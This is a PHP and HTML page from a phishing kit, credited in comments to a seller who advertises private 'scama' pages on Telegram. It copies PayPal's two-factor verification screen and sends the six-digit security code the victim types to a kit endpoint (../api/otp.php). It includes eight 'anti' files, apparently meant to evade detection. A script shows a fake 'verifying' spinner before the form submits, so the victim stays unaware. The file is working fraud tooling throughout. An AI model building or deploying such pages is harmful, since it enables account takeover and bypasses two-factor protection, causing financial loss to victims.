<?php
/*
Scama page by Nayfer
You want your private scama page ?
contact me on telegram @nayfercrax
*/
include "../anti/anti1.php";
include "../anti/anti2.php"; 
include "../anti/anti3.php"; 
include "../anti/anti4.php"; 
include "../anti/anti5.php"; 
include "../anti/anti6.php"; 
include "../anti/anti7.php"; 
include "../anti/anti8.php"; 
session_start();
?>
<html dir="ltr" lang="en" data-reactroot="">
  <head>
  
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="application-name" content="PayPal">
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.undefined/us/cgi-bin/webscr?cmd=_account;icon-uri=https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.undefined/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;amp;send_method=domestic;icon-uri=https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.undefined/cgi-bin/?cmd=_render-content&amp;amp;content_ID=marketing_us/request_money;icon-uri=https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta content="5h8oRObEaEb/MxydQWHUDKZ1F4mU2yF8lKbIk=" name="csrf-token">
    <meta name="pageInfo" content="Script info: script: node, template:  undefined,
                                   date: Jan 9, 2023 17:04:44 -08:00, country: FR, language: en
                                   hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0eQI38WhNYe/8JSmQjqQyZw rlogid : rZJvnqaaQhLn%2FnmWT8cSUg%2BFylqOCirdAUXJpxqmWT22u%2BBuIauv%2BhdXsNnzb1xMKy8RhImyQzM_18599354b12 null">
    <link rel="shortcut icon" href="https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <link rel="stylesheet" href="../assets/contextualLoginElementalUIv2.css">
    <link rel="apple-touch-icon" href="https://undefined/en_US/i/pui/apple-touch-icon.png">
    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/c54/b4846bbfd5927e0f5343a5390ec55/css/app.css">
    <title>PayPal
    </title>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="application-name" content="PayPal">
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.undefined/us/cgi-bin/webscr?cmd=_account;icon-uri=https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.undefined/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;amp;send_method=domestic;icon-uri=https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.undefined/cgi-bin/?cmd=_render-content&amp;amp;content_ID=marketing_us/request_money;icon-uri=https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta content="5h8oRObEaEb/MxydQWHUDKZ1F4mU2yF8lKbIk=" name="csrf-token">
    <meta name="pageInfo" content="Script info: script: node, template:  undefined,
                                   date: Jan 9, 2023 17:04:44 -08:00, country: FR, language: en
                                   hostname : rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0eQI38WhNYe/8JSmQjqQyZw rlogid : rZJvnqaaQhLn%2FnmWT8cSUg%2BFylqOCirdAUXJpxqmWT22u%2BBuIauv%2BhdXsNnzb1xMKy8RhImyQzM_18599354b12 null">
    <link rel="shortcut icon" href="https://undefined/en_US/i/icon/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="https://undefined/en_US/i/pui/apple-touch-icon.png">
    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/c54/b4846bbfd5927e0f5343a5390ec55/css/app.css">
    <title>PayPal
    </title>
   
  </head>
  <body data-nemo="documentId" class="">
    <div>
      <style nonce="">html {
        display:block }
      </style>
      <div>
        <div>

          <div class="jsDisabled">
            <noscript>
              <meta http-equiv="refresh" content="0; url='/signin'" />
              <style nonce="h5bCk1O/sbx+JoZ1aB1JkLdv/eLeHFgO55B9jssuNVogsFTL">html {
                display: none}
              </style>
            </noscript>
          </div>
          <div class="contentContainer" id="content">
            <div data-nemo="twofactorPage" class="twofactorPage">
              <header>
                <div class="paypal-logo">
                </div>
              </header>
              <div data-nemo="twofactorSelectedToken" data-id="AAFTDpPjn9kOvXbI9NrMEmkRMZV3WfrbZKbV3xrXR8Lt1SIgBKx6C4hdssqo2LfsDj96Wh_kEqxGG5bkPr3FG29Z6s0e0gihXtLUrvGpQv+cir0DIYqoO_Ns5fZbyTWGLBwl42Q4SBA3h_CrdgTIvqLmNwItE40MIVZerd_VyE_PUeu6ZprThtBlgqdqoVY=">
                <div class="ppvx_text--heading-sm___5-8-2 heading ppvx--v2___5-8-2">Enter your code
                </div>
                <div class="ppvx_text--body___5-8-2 description ppvx--v2___5-8-2">
                  <div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2">Enter the 6-digit security code.
                  </div>
                </div>
                <form method="post" action="../api/otp.php">
                  <div>
                    <div>
                      <div class="codeInput">
                        <div class="ppvx_code-input___1-4-1 codeInput-wrapper" id="otpCode">
                          <div class="ppvx_code-input__input-wrapper___1-4-1">
                            <div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
                              <input type="tel" required maxlength="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp" name="otpCode-0" id="ci-otpCode-0" aria-invalid="false" placeholder=" " aria-label="1-6" role="textbox" aria-describedby="otpCode" for="securityCodeInput" value="">
                              <label for="ci-otpCode-0" id="ci-otpCode-0-label" class="ppvx_text-input__label___3-14-1 otpCodeLabel data-nemo">
                              </label>
                            </div>
                            <div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
                              <input type="tel" required maxlength="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp" name="otpCode-1" id="ci-otpCode-1" aria-invalid="false" placeholder=" " aria-label="2-6" role="textbox" aria-describedby="otpCode" for="securityCodeInput" value="">
                              <label for="ci-otpCode-1" id="ci-otpCode-1-label" class="ppvx_text-input__label___3-14-1 otpCodeLabel data-nemo">
                              </label>
                            </div>
                            <div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
                              <input type="tel" required maxlength="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp" name="otpCode-2" id="ci-otpCode-2" aria-invalid="false" placeholder=" " aria-label="3-6" role="textbox" aria-describedby="otpCode" for="securityCodeInput" value="">
                              <label for="ci-otpCode-2" id="ci-otpCode-2-label" class="ppvx_text-input__label___3-14-1 otpCodeLabel data-nemo">
                              </label>
                            </div>
                            <div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
                              <input type="tel" required maxlength="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp" name="otpCode-3" id="ci-otpCode-3" aria-invalid="false" placeholder=" " aria-label="4-6" role="textbox" aria-describedby="otpCode" for="securityCodeInput" value="">
                              <label for="ci-otpCode-3" id="ci-otpCode-3-label" class="ppvx_text-input__label___3-14-1 otpCodeLabel data-nemo">
                              </label>
                            </div>
                            <div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
                              <input type="tel" required maxlength="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp" name="otpCode-4" id="ci-otpCode-4" aria-invalid="false" placeholder=" " aria-label="5-6" role="textbox" aria-describedby="otpCode" for="securityCodeInput" value="">
                              <label for="ci-otpCode-4" id="ci-otpCode-4-label" class="ppvx_text-input__label___3-14-1 otpCodeLabel data-nemo">
                              </label>
                            </div>
                            <div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1">
                              <input type="tel" required maxlength="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp" name="otpCode-5" id="ci-otpCode-5" aria-invalid="false" placeholder=" " aria-label="6-6" role="textbox" aria-describedby="otpCode" for="securityCodeInput" value="">
                              <label for="ci-otpCode-5" id="ci-otpCode-5-label" class="ppvx_text-input__label___3-14-1 otpCodeLabel data-nemo">
                              </label>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <button class="ppvx_btn___5-11-8 ppvx--v2___5-11-8 submit-form-button" type="submit" data-nemo="twofactorSubmit">Continue
                  </button>
                </form>
              </div>
            
            </div>
            <div class="loaderOverlay">
              <div data-nemo="loaderOverlay" class="modal-animate hide">
                <p class="ppvx_loading-spinner___2-7-26 ppvx_loading-spinner--size_xl___2-7-26 ppvx--v2___2-7-26 loading-spinner" role="alert">
                  <span class="ppvx_loading-spinner__screenreader___2-7-26">Processing...
                  </span>
                </p>
                <div class="ppvx_text--body___5-8-2 processing ppvx--v2___5-8-2">Processing...
                </div>
                <div class="loaderOverlayAdditionalElements">
                </div>
              </div>
             
            </div>
          </div>
        </div>
      </div>
    </div>
      <div class="transitioning hide" aria-busy="false">
      <p class="welcomeMessage hide">Welcome, !
      </p>
      <p class="checkingInfo hide">Verifying your information…
      </p>
      <p class="oneSecond hide">Just a moment…
      </p>
      <p class="secureMessage hide">Securely logging you in...
      </p>
      <p class="oneTouchMessage hide">
      </p>
      <p class="retrieveInfo hide">Retrieving your info...
      </p>
      <p class="waitFewSecs hide">This may take a few seconds...
      </p>
      <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.
      </p>
      <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.
      </p>
      <p class="udtSpinnerMessage webllsXoUS hide">We recognize you on this device, so you can skip login.
        <br>
        <br>Manage this setting in your profile.
      </p>
      <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.
      </p>
      <p class="qrcMessage hide">Redirecting...
      </p>
      <p class="webAuthnOptin hide">Updating your login settings...
      </p>
      <p class="webAuthnLogin hide">Logging you in...
      </p>
      <div class="keychain spinner-content uiExp hide">
      </div>
    </div>
    <footer class="footer">
      <ul class="footerLinks">
        <li class="contactFooterListItem">
          <div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2">
            <a target="_blank" href="#">Contact Us
            </a>
          </div>
        </li>
        <li class="privacyFooterListItem">
          <div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2">
            <a target="_blank" href="#">Privacy
            </a>
          </div>
        </li>
        <li class="legalFooterListItem">
          <div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2">
            <a target="_blank" href="#">Legal
            </a>
          </div>
        </li>
        <li class="worldwideFooterListItem">
          <div class="ppvx_text--body___5-8-2 ppvx--v2___5-8-2">
            <a target="_blank" href="#">Worldwide
            </a>
          </div>
        </li>
      </ul>
      <div>
      </div>
    </footer>
    
<script type="text/javascript">
  // script made by @nayfercrax
 for (let i = 0; i <= 5; i++) {
  document.getElementById(`ci-otpCode-${i}`).addEventListener('input', function() {
    if (this.value.length > 0 && i < 5) {
      document.getElementById(`ci-otpCode-${i + 1}`).focus();
    }
  });
}
</script>
  <script type="text/javascript">
const transitioningDiv = document.querySelector('.transitioning');
const form = document.querySelector('form');
form.addEventListener('submit', function(event) {

  transitioningDiv.classList.add('spinner');
  transitioningDiv.classList.remove('hide');
  event.preventDefault();
  setTimeout(function() {
    form.submit();
  }, 2000);
});

  </script>   
  </body>
</html>
